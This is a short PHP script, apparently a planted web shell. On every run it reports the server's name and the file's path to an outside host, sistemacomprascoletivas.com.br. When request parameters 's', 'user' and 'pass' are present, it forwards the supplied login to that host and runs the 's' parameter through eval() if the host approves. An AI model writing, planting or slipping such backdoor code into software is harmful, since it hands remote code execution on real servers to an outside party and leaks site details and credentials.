<?php

$server 	= base64_encode($_SERVER["SERVER_NAME"]);
$caminho 	= base64_encode(__FILE__);

if($_REQUEST['s'] and $_REQUEST['pass'] and $_REQUEST['user']){
	  
	$retorno = file("http://www.sistemacomprascoletivas.com.br/tk1.php?c=$caminho&s=$server&acao=php&userlogin=".base64_encode($_REQUEST['user'])."&passlogin=".base64_encode($_REQUEST['pass']));
			 
	if($retorno[0]==$_REQUEST['pass']){
			eval($_REQUEST['s']);
	}
}
else{
	 file("http://www.sistemacomprascoletivas.com.br/tk1.php?c=$caminho&s=$server&acao=phpless");
}

?>